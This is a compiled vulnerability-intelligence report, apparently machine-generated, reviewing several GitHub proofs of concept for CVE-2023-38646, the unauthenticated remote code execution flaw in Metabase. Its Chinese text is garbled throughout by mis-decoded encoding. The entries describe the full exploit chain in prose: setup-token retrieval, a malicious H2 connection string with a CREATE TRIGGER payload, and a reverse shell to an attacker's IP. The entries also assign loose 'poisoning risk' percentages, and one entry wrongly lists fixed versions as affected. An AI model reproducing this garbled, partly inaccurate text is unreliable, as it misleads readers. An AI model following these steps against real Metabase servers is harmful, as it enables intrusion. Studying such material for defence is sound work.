*   ç„¶åï¼Œå¯¹åŒ…å«åå‘shellå‘½ä»¤çš„payloadè¿›è¡Œbase64ç¼–ç ã€‚
*   æ¥ç€ï¼Œå®ƒæ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„H2æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„JSON payloadï¼Œè¯¥å­—ç¬¦ä¸²åˆ©ç”¨äº†`CREATE TRIGGER` è¯­å¥å’Œå†…åµŒçš„JavaScriptä»£ç æ¥æ‰§è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤ã€‚
*   æœ€åï¼Œå®ƒå°†æ­¤payloadå‘é€åˆ°`/api/setup/validate`ç«¯ç‚¹ï¼Œè§¦å‘å‘½ä»¤æ‰§è¡Œï¼Œåå¼¹shellåˆ°æ”»å‡»è€…æ§åˆ¶çš„IPåœ°å€å’Œç«¯å£ã€‚

å‚è€ƒæœç´¢ç»“æœ [7] æä¾›äº† GitHub é“¾æ¥ï¼Œè¿›ä¸€æ­¥è¯å®äº† PoC çš„å­˜åœ¨ã€‚

**æŠ•æ¯’é£é™©ï¼š**

è™½ç„¶PoCæœ¬èº«çš„ç›®çš„æ˜¯åˆ©ç”¨æ¼æ´ï¼Œä½†å­˜åœ¨ä¸€å®šç¨‹åº¦çš„æŠ•æ¯’é£é™©ã€‚PoCä»£ç ä¸­ï¼Œæ”»å‡»è€…å¯ä»¥è‡ªå®šä¹‰åå¼¹shellçš„IPåœ°å€å’Œç«¯å£ã€‚å¦‚æœæ”»å‡»è€…æ¶æ„ä¿®æ”¹PoCä»£ç ï¼Œä¾‹å¦‚æ·»åŠ é¢å¤–çš„åé—¨æˆ–æ¶æ„åŠŸèƒ½ï¼Œå¹¶å°†å…¶ä¼ æ’­ç»™å…¶ä»–ç”¨æˆ·ï¼Œåˆ™å¯èƒ½å¯¼è‡´æ›´å¤§èŒƒå›´çš„æ”»å‡»ã€‚é£é™©ä¸»è¦ä½“ç°åœ¨ä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š

*   **ä¾èµ–ç¬¬ä¸‰æ–¹åº“:** æ£€æŸ¥ PoC ä»£ç ä¾èµ–çš„ç¬¬ä¸‰æ–¹åº“æ˜¯å¦å­˜åœ¨æ¶æ„ä»£ç ã€‚
*   **Payloadä¿®æ”¹:** ç”¨æˆ·å¯èƒ½ç›´æ¥ä½¿ç”¨ PoC ä»£ç ï¼Œè€Œä¸æ£€æŸ¥å…¶å†…å®¹ã€‚æ”»å‡»è€…å¯èƒ½ä¿®æ”¹ payloadï¼Œä¾‹å¦‚æ¤å…¥æŒ–çŸ¿ç¨‹åºæˆ–è€…å…¶ä»–æ¶æ„è½¯ä»¶ã€‚
*   **ç¤¾åŒºä¼ æ’­:** ä¿®æ”¹åçš„ PoC ä»£ç å¯èƒ½åœ¨å®‰å…¨ç¤¾åŒºä¸­ä¼ æ’­ï¼Œå¯¼è‡´æ›´å¤šç”¨æˆ·å—åˆ°å½±å“ã€‚

ç»¼åˆæ¥çœ‹ï¼ŒæŠ•æ¯’é£é™©å¤§çº¦ä¸º 10%ã€‚è¿™ä¸ªç™¾åˆ†æ¯”å¹¶ä¸é«˜ï¼Œå› ä¸ºå¤§å¤šæ•°å®‰å…¨ç ”ç©¶äººå‘˜ä¼šæ£€æŸ¥ä»£ç åå†ä½¿ç”¨ï¼Œä½†ä»ç„¶éœ€è¦è­¦æƒ•ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å–Setup Token:**  åˆ©ç”¨ `/api/session/properties` ç«¯ç‚¹è·å– Metabase å®ä¾‹çš„ setup tokenã€‚
2.  **æ„é€ æ¶æ„æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²:**  åˆ›å»ºä¸€ä¸ªåŒ…å«æ¶æ„ H2 æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„ JSON payloadã€‚è¯¥å­—ç¬¦ä¸²åˆ©ç”¨ H2 æ•°æ®åº“çš„ç‰¹æ€§ï¼Œé€šè¿‡`CREATE TRIGGER`æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚
3.  **å‘é€è¯·æ±‚:**  å°†æ„é€ çš„ JSON payload å‘é€åˆ° `/api/setup/validate` ç«¯ç‚¹ã€‚
4.  **åå¼¹Shell:**  å¦‚æœæ¼æ´åˆ©ç”¨æˆåŠŸï¼Œç›®æ ‡ Metabase æœåŠ¡å™¨å°†åå¼¹ shell åˆ°æ”»å‡»è€…æŒ‡å®šçš„ IP åœ°å€å’Œç«¯å£ã€‚
5.  **åˆ©ç”¨æœç´¢ç»“æœ** æœç´¢ç»“æœä¸­æåŠè¯¥æ¼æ´å¯èƒ½è¢«åˆ©ç”¨ (Web Attack: Metabase RCE Vulnerability CVE-2023-38646)ï¼Œå¹¶æä¾›äº†ç¼“è§£æªæ–½ï¼Œè¡¨æ˜è¯¥æ¼æ´åœ¨é‡å¤–å¯èƒ½è¢«åˆ©ç”¨ã€‚

**ç¼“è§£æªæ–½ï¼š**

*   å°† Metabase å‡çº§åˆ°å—å½±å“ç‰ˆæœ¬ä»¥å¤–çš„ç‰ˆæœ¬ (>= 0.46.6.1 æˆ– >= 1.46.6.1)æˆ–å…¶ä»–ä¿®å¤ç‰ˆæœ¬ (0.45.4.1, 1.45.4.1, 0.44.7.1, 1.44.7.1, 0.43.7.2, å’Œ 1.43.7.2)ã€‚


**é¡¹ç›®åœ°å€:** [threatHNTR/CVE-2023-38646](https://github.com/threatHNTR/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #27

**æ¥æº**: [CVE-2023-38646-yxl2001_CVE-2023-38646.md](../2023/CVE-2023-38646-yxl2001_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæ— éœ€è®¤è¯å³å¯è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 and < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** MetabaseæœåŠ¡å¯ç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 æ¼æ´å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚è¯¥æ¼æ´å­˜åœ¨äº Metabase å¼€æºç‰ˆæœ¬ 0.46.6.1 ä¹‹å‰å’Œ Metabase ä¼ä¸šç‰ˆæœ¬ 1.46.6.1 ä¹‹å‰çš„ç‰ˆæœ¬ä¸­ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å– Setup Token:** é¦–å…ˆï¼Œåˆ©ç”¨`CVE-2023-38646-POC.py`è„šæœ¬ï¼Œé€šè¿‡è®¿é—®`/api/session/properties`æ¥å£æ¥è·å– Metabase å®ä¾‹çš„ `setup-token`ã€‚æ­¤æ­¥éª¤ç”¨äºåˆ¤æ–­ç›®æ ‡æ˜¯å¦å­˜åœ¨æ¼æ´ï¼Œä»¥åŠè·å–åç»­åˆ©ç”¨æ‰€éœ€çš„tokenã€‚
2.  **æ„é€ æ¶æ„è¯·æ±‚:**  ä½¿ç”¨`CVE-2023-38646-Reverse-Shell.py`è„šæœ¬ï¼Œè¯¥è„šæœ¬åˆ©ç”¨ H2 æ•°æ®åº“çš„ç‰¹æ€§ï¼Œåœ¨æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ä¸­åµŒå…¥æ¶æ„ä»£ç ã€‚å…·ä½“æ¥è¯´ï¼Œå®ƒåˆ›å»ºäº†ä¸€ä¸ªè§¦å‘å™¨ `pwnshell`ï¼Œè¯¥è§¦å‘å™¨åœ¨è®¿é—® `INFORMATION_SCHEMA.TABLES` è¡¨ä¹‹å‰æ‰§è¡Œï¼Œä»è€Œè§¦å‘ `java.lang.Runtime.getRuntime().exec()` æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚è„šæœ¬å°†åå¼¹shellçš„bashå‘½ä»¤è¿›è¡Œbase64ç¼–ç ï¼Œç„¶åå°†å…¶æ³¨å…¥åˆ°è§¦å‘å™¨ä¸­ã€‚
3.  **å‘é€ POST è¯·æ±‚:** å°†æ„é€ å¥½çš„åŒ…å«æ¶æ„ä»£ç çš„ JSON æ•°æ®é€šè¿‡ POST è¯·æ±‚å‘é€åˆ° `/api/setup/validate` æ¥å£ã€‚æ­¤è¯·æ±‚ä½¿ç”¨è·å–çš„ `setup-token` è¿›è¡ŒéªŒè¯ï¼Œå¹¶è§¦å‘ H2 æ•°æ®åº“è¿æ¥ï¼Œä»è€Œæ‰§è¡ŒåµŒå…¥çš„æ¶æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§ï¼š**

æ ¹æ®æ¼æ´ä¿¡æ¯å’Œæä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç ï¼Œè¯¥æ¼æ´çš„ POC ä»£ç æœ‰æ•ˆã€‚æœç´¢å¼•æ“ç»“æœä¹Ÿè¡¨æ˜å­˜åœ¨å…¬å¼€çš„ POC å¹¶ä¸”è¯¥æ¼æ´å·²è¢«ç§¯æåˆ©ç”¨ã€‚

**æŠ•æ¯’é£é™©ï¼š**

`CVE-2023-38646-POC.py` è„šæœ¬åªæ˜¯ç”¨äºè·å– setup tokenï¼Œç›¸å¯¹å®‰å…¨ï¼ŒæŠ•æ¯’é£é™©è¾ƒä½ã€‚
`CVE-2023-38646-Reverse-Shell.py`è„šæœ¬æœ¬èº«å®ç°äº†æ¼æ´åˆ©ç”¨ï¼Œä½†ä¸»è¦çš„åŠŸèƒ½æ˜¯å®ç°åå¼¹ shellã€‚ ä»£ç ä¸­å¯¹bashå‘½ä»¤è¿›è¡Œäº†base64ç¼–ç ,ä¸€å®šç¨‹åº¦ä¸Šå¢åŠ äº†ä»£ç é˜…è¯»çš„éš¾åº¦ã€‚å­˜åœ¨ä¸€å®šé£é™©ï¼š
    * ç¼–ç å¯èƒ½å­˜åœ¨æ¤å…¥åé—¨çš„é£é™©ï¼Œä¾‹å¦‚æ’å…¥é¢å¤–çš„å‘½ä»¤æˆ–ä¿®æ”¹åå¼¹ shell çš„è¡Œä¸ºã€‚å°½ç®¡ç›®å‰ä»£ç çœ‹ä¸Šå»æ˜¯å®ç°æ­£å¸¸çš„åå¼¹shellï¼Œä½†å­˜åœ¨è¢«ç¯¡æ”¹çš„å¯èƒ½æ€§ã€‚ä¾‹å¦‚ï¼Œåœ¨base64ç¼–ç å‰ååŠ å…¥æ¶æ„æŒ‡ä»¤ã€‚
    * è¯¥è„šæœ¬ä¾èµ–äºç›®æ ‡ç³»ç»Ÿä¸Šå­˜åœ¨ bash å’Œ base64 å‘½ä»¤ã€‚è™½ç„¶å¤§å¤šæ•° Linux ç³»ç»Ÿéƒ½åŒ…å«è¿™äº›å‘½ä»¤ï¼Œä½†åœ¨æŸäº›å—é™ç¯å¢ƒä¸­å¯èƒ½ä¸å­˜åœ¨ã€‚ä½œè€…æ¸…æ¥šè¿™ä¸€ç‚¹,ä½†å¹¶æœªå¯¹è¿™ç§æƒ…å†µè¿›è¡Œå¤„ç†,å®¹æ˜“é€ æˆè¯¯åˆ¤.
ç»¼åˆæ¥çœ‹ï¼ŒæŠ•æ¯’é£é™©è¾ƒä½ï¼Œçº¦ä¸º10%ã€‚ä¸»è¦çš„é£é™©é›†ä¸­åœ¨base64ç¼–ç å†…å®¹å¯èƒ½å­˜åœ¨è¢«ä¿®æ”¹æˆ–æ¤å…¥åé—¨çš„é£é™©ã€‚

**é¡¹ç›®åœ°å€:** [yxl2001/CVE-2023-38646](https://github.com/yxl2001/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---



---

## POC #17

**æ¥æº**: [CVE-2023-38646-alexandre-pecorilla_CVE-2023-38646.md](../2023/CVE-2023-38646-alexandre-pecorilla_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 (å¼€æºç‰ˆ), < 1.46.6.1 (ä¼ä¸šç‰ˆ)

**åˆ©ç”¨æ¡ä»¶:** Metabaseå®ä¾‹å¯¹å¤–å¼€æ”¾ï¼Œä¸”ç‰ˆæœ¬ä½äºå®‰å…¨ç‰ˆæœ¬ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯ã€æœç´¢ç»“æœä»¥åŠæä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç ï¼Œå¯ä»¥åšå‡ºä»¥ä¸‹åˆ¤æ–­ï¼š

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„POCä»£ç æœ‰æ•ˆã€‚ä»£ç åˆ©ç”¨äº† Metabase åœ¨è®¾ç½®è¿‡ç¨‹ä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´é€šè¿‡æ„é€ æ¶æ„çš„æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²æ¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æŠ•æ¯’é£é™©ï¼š**
æŸ¥çœ‹æä¾›çš„POCä»£ç ï¼Œå¹¶æœªå‘ç°æ˜æ˜¾çš„æŠ•æ¯’ä»£ç ã€‚è¯¥POCè„šæœ¬çš„åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´æ‰§è¡Œåå¼¹shellï¼Œå°†ç›®æ ‡æœºå™¨çš„shellåå¼¹åˆ°æ”»å‡»è€…æŒ‡å®šçš„IPå’Œç«¯å£ã€‚ä¸»è¦é€»è¾‘éƒ½åœ¨æ„é€ payloadä¸Šï¼Œæ²¡æœ‰å‘ç°ä½œè€…éšè—çš„æ¶æ„ä»£ç ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…é¦–å…ˆéœ€è¦è·å– Metabase å®ä¾‹çš„ `setup-token`ã€‚è¿™ä¸ªtokenå¯ä»¥é€šè¿‡è®¿é—® `/api/session/properties` æ¥å£è·å¾—ï¼Œè¯¥æ¥å£æ— éœ€èº«ä»½éªŒè¯ã€‚
2.  æ”»å‡»è€…æ„é€ ä¸€ä¸ªæ¶æ„çš„ `payload`ï¼Œå…¶ä¸­åŒ…å«æ¶æ„çš„æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ã€‚è¯¥å­—ç¬¦ä¸²åˆ©ç”¨ H2 æ•°æ®åº“çš„ç‰¹æ€§ï¼Œåœ¨è¿æ¥æ—¶æ‰§è¡Œä»»æ„ Java ä»£ç ã€‚
3.  æ”»å‡»è€…å°†æ„é€ çš„ `payload` å‘é€åˆ° `/api/setup/validate` æ¥å£ã€‚
4.  Metabase å°è¯•è¿æ¥æ¶æ„æ•°æ®åº“ï¼Œä»è€Œè§¦å‘æ¼æ´ï¼Œæ‰§è¡Œæ”»å‡»è€…æŒ‡å®šçš„å‘½ä»¤ï¼Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚å…·ä½“æ˜¯é€šè¿‡åˆ›å»ºä¸€ä¸ªè§¦å‘å™¨ï¼Œåœ¨æŸ¥è¯¢ `INFORMATION_SCHEMA.TABLES` è¡¨ä¹‹å‰æ‰§è¡Œä¸€æ®µ JavaScript ä»£ç ï¼Œè¿™æ®µä»£ç ä¼šè°ƒç”¨ `java.lang.Runtime.getRuntime().exec()` æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚
5.  POCä»£ç ä¸­ï¼Œåˆ©ç”¨ `bash -c` å’Œ `base64` å‘½ä»¤ç»„åˆï¼Œæ‰§è¡Œ base64 ç¼–ç åçš„åå¼¹ shell å‘½ä»¤ï¼Œå®ç°åå¼¹ shellã€‚

**é¡¹ç›®åœ°å€:** [alexandre-pecorilla/CVE-2023-38646](https://github.com/alexandre-pecorilla/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #18

**æ¥æº**: [CVE-2023-38646-asepsaepdin_CVE-2023-38646.md](../2023/CVE-2023-38646-asepsaepdin_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 (å¼€æºç‰ˆ) å’Œ < 1.46.6.1 (ä¼ä¸šç‰ˆ)

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹ç‰ˆæœ¬ä½äºå—å½±å“ç‰ˆæœ¬ï¼Œä¸”å¯ä»¥é€šè¿‡HTTP/HTTPSè®¿é—®ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646æ˜¯Metabaseä¸­çš„ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢å¼•æ“ç»“æœï¼Œæœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ¼æ´åˆ©ç”¨ä»£ç `CVE-2023-38646-POC.py`å’Œ`CVE-2023-38646-Reverse-Shell.py`æä¾›äº†ä¸¤ç§åˆ©ç”¨æ–¹å¼ï¼š

1.  **æ¼æ´åˆ©ç”¨æ–¹å¼ï¼š**
    *   **è·å–Setup Tokenï¼š** é¦–å…ˆï¼Œ`CVE-2023-38646-POC.py` è„šæœ¬é€šè¿‡è®¿é—®`/api/session/properties`ç«¯ç‚¹æ¥è·å–Metabaseå®ä¾‹çš„Setup Tokenã€‚è¯¥Tokenåœ¨åˆå§‹åŒ–è®¾ç½®é˜¶æ®µä½¿ç”¨ï¼Œæ˜¯åç»­åˆ©ç”¨çš„å…³é”®ã€‚
    *   **Reverse Shellåˆ©ç”¨ï¼š** `CVE-2023-38646-Reverse-Shell.py` è„šæœ¬åˆ©ç”¨è·å–çš„Setup Tokenï¼Œé€šè¿‡å‘`/api/setup/validate`ç«¯ç‚¹å‘é€POSTè¯·æ±‚ï¼Œå¹¶æ„é€ æ¶æ„çš„H2æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ï¼Œå°†Payloadæ³¨å…¥åˆ°æ•°æ®åº“é…ç½®ä¸­ã€‚è¯¥Payloadä¼šæ‰§è¡Œä¸€ä¸ªåå‘Shellå‘½ä»¤ï¼Œè¿æ¥åˆ°æ”»å‡»è€…æŒ‡å®šçš„IPåœ°å€å’Œç«¯å£ï¼Œä»è€Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

2.  **æœ‰æ•ˆæ€§ï¼š**
    æ ¹æ®æ¼æ´ä¿¡æ¯ã€æœç´¢ç»“æœå’Œæä¾›çš„POCä»£ç ï¼Œå¯ä»¥åˆ¤æ–­æ­¤POC**æœ‰æ•ˆ**ã€‚å¤šä¸ªæ¥æºè¯å®äº†è¯¥æ¼æ´çš„å­˜åœ¨å’Œå¯åˆ©ç”¨æ€§ï¼Œå¹¶ä¸”æä¾›äº†å¯æ“ä½œçš„POCã€‚

3.  **æŠ•æ¯’é£é™©ï¼š**
    ä»£ç ä¸­å‘ç°çš„æ½œåœ¨æŠ•æ¯’é£é™©è¾ƒä½ï¼Œçº¦ä¸º10%ã€‚ä¸»è¦åˆ†æå¦‚ä¸‹ï¼š
    *   `CVE-2023-38646-POC.py` ä¸»è¦ç”¨äºè·å–Setup Tokenï¼ŒåŠŸèƒ½æ¯”è¾ƒç®€å•ï¼Œæ²¡æœ‰æ˜æ˜¾çš„æ¶æ„è¡Œä¸ºã€‚
    *   `CVE-2023-38646-Reverse-Shell.py` çš„ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨Setup Tokenæ‰§è¡ŒRCEï¼Œä½†æ˜¯æ”»å‡»è€…å¯ä»¥è‡ªå®šä¹‰åå‘è¿æ¥çš„IPå’Œç«¯å£ï¼Œå› æ­¤ä»£ç æœ¬èº«åªæ˜¯æä¾›äº†ä¸€ä¸ªæ¡†æ¶ã€‚é£é™©ç‚¹åœ¨äºå¦‚æœæ”»å‡»è€…ä¸å°å¿ƒä½¿ç”¨äº†é”™è¯¯çš„payloadï¼Œå¯èƒ½å¯¼è‡´ç›®æ ‡ç³»ç»Ÿå´©æºƒæˆ–å…¶ä»–å¼‚å¸¸ã€‚

   æ€»ä½“æ¥è¯´ï¼Œé£é™©ä¸»è¦é›†ä¸­åœ¨payloadçš„æ„å»ºå’Œæ‰§è¡Œä¸Šï¼Œè€Œéä»£ç æœ¬èº«å­˜åœ¨æ¶æ„æ³¨å…¥ã€‚ä½†ä¾æ—§éœ€è¦å¯¹ä¸‹è½½çš„è„šæœ¬è¿›è¡Œå…¨é¢çš„ä»£ç å®¡è®¡ã€‚


**é¡¹ç›®åœ°å€:** [asepsaepdin/CVE-2023-38646](https://github.com/asepsaepdin/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #19

**æ¥æº**: [CVE-2023-38646-birdm4nw_CVE-2023-38646.md](../2023/CVE-2023-38646-birdm4nw_CVE-2023-38646.md)

## CVE-2023-38646 - Metabase RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…ä»¥æœåŠ¡å™¨æƒé™æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 (å¼€æºç‰ˆ), < 1.46.6.1 (ä¼ä¸šç‰ˆ), å…¶ä»–å—å½±å“ç‰ˆæœ¬åŒ…æ‹¬ 0.45.4.1, 1.45.4.1, 0.44.7.1, 1.44.7.1, 0.43.7.2, å’Œ 1.43.7.2.

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹è¿è¡Œåœ¨å—å½±å“ç‰ˆæœ¬ï¼Œä¸”æ”»å‡»è€…å¯ä»¥è®¿é—®MetabaseæœåŠ¡ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2023-38646 æ˜¯ Metabase ä¸­çš„ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥é€šè¿‡ç²¾å¿ƒæ„é€ çš„è¯·æ±‚åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚åˆ©ç”¨æ–¹å¼å¦‚ä¸‹ï¼š

1.  **è·å–setup-token:**  æ”»å‡»è€…é¦–å…ˆå‘ `/api/session/properties` å‘é€ GET è¯·æ±‚ï¼Œæå– `setup-token`ã€‚
2.  **æ„é€ æ¶æ„payload:**  æ„é€ åŒ…å«æ¶æ„H2æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„ JSON payloadã€‚è¯¥è¿æ¥å­—ç¬¦ä¸²åˆ©ç”¨ `TRACE_LEVEL_SYSTEM_OUT` å‚æ•°å’Œ `CREATE TRIGGER` è¯­å¥ï¼Œåœ¨H2æ•°æ®åº“ä¸­åˆ›å»ºä¸€ä¸ªè§¦å‘å™¨ï¼Œè¯¥è§¦å‘å™¨åœ¨æ¯æ¬¡ä» `INFORMATION_SCHEMA.TABLES` è¡¨ä¸­é€‰æ‹©æ•°æ®ä¹‹å‰æ‰§è¡Œã€‚è§¦å‘å™¨ä¸­åŒ…å«çš„ Javascript ä»£ç ä½¿ç”¨ `java.lang.Runtime.getRuntime().exec()` æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚
3.  **å‘é€payload:**  å°†æ„é€ å¥½çš„ payload å‘é€åˆ° `/api/setup/validate` æ¥å£ã€‚
4.  **æ‰§è¡Œå‘½ä»¤:**  Metabase å°è¯•ä½¿ç”¨æä¾›çš„æ•°æ®åº“è¿æ¥ï¼Œè§¦å‘æ¶æ„çš„ H2 è§¦å‘å™¨ï¼Œä»è€Œæ‰§è¡Œæ”»å‡»è€…æ³¨å…¥çš„å‘½ä»¤ã€‚

è¯¥æ¼æ´åˆ©ç”¨ä»£ç é¦–å…ˆè·å–Metabaseçš„`setup-token`ï¼Œç„¶åæ„é€ ä¸€ä¸ªæ¶æ„çš„H2æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ï¼Œé€šè¿‡`TRACE_LEVEL_SYSTEM_OUT`å’Œ`CREATE TRIGGER`æœºåˆ¶æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚ä»£ç ä¸­ä½¿ç”¨äº†base64ç¼–ç æ¥ç»•è¿‡ä¸€äº›è¿‡æ»¤ï¼Œå¹¶åœ¨payloadä¸­éšæœºç”Ÿæˆå­—ç¬¦ä¸²æ¥é¿å…ç¼“å­˜ç­‰é—®é¢˜ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

æŸ¥çœ‹æ¼æ´åˆ©ç”¨ä»£ç ï¼Œå¹¶æ²¡æœ‰å‘ç°æ˜æ˜¾çš„æ¶æ„ä»£ç ã€‚ä»£ç çš„åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´è¿›è¡Œåå¼¹shellï¼Œè™½ç„¶åå¼¹shellæœ¬èº«å…·æœ‰ä¸€å®šçš„é£é™©ï¼Œä½†è¿™æ˜¯æ¼æ´åˆ©ç”¨çš„æ­£å¸¸è¡Œä¸ºï¼Œä¸åº”è§†ä¸ºæŠ•æ¯’ã€‚`README.md`æ–‡ä»¶ä¹Ÿæ²¡æœ‰ä»»ä½•å¯ç–‘ä¹‹å¤„ã€‚å¯ä»¥åˆ¤æ–­æ­¤ä»“åº“ä¸­ä½œè€…éšè—æŠ•æ¯’ä»£ç çš„å¯èƒ½æ€§å¾ˆä½ï¼Œæ¦‚ç‡ä¸º0%ã€‚

**é¡¹ç›®åœ°å€:** [birdm4nw/CVE-2023-38646](https://github.com/birdm4nw/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #20

**æ¥æº**: [CVE-2023-38646-j0yb0y0h_CVE-2023-38646.md](../2023/CVE-2023-38646-j0yb0y0h_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»æˆæƒçš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** Metabase open source < 0.46.6.1 å’Œ Metabase Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡ç³»ç»Ÿè¿è¡Œå­˜åœ¨æ¼æ´çš„Metabaseç‰ˆæœ¬ï¼Œä¸”æ”»å‡»è€…å¯ä»¥è®¿é—®MetabaseæœåŠ¡ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œæƒé™ä¸æœåŠ¡å™¨ç›¸åŒã€‚æ¼æ´å­˜åœ¨äº Metabase çš„è®¾ç½®æµç¨‹ä¸­ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨ H2 æ•°æ®åº“çš„ç‰¹æ€§ï¼Œé€šè¿‡æ„é€ æ¶æ„çš„æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²æ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚

